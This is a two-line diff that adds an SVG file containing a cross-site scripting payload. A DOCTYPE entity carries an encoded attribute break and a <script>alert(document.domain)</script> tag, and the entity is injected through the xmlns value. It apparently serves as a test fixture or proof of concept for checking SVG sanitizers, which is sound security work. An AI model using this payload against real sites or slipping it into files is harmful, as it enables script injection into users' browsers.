@@ -1,0 +1,2 @@
+<!DOCTYPE s:svg [<!ENTITY p "&#34;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;">]>
+<s:svg xmlns:s="http://www.w3.org/2000/svg" xmlns="&p;"></s:svg>
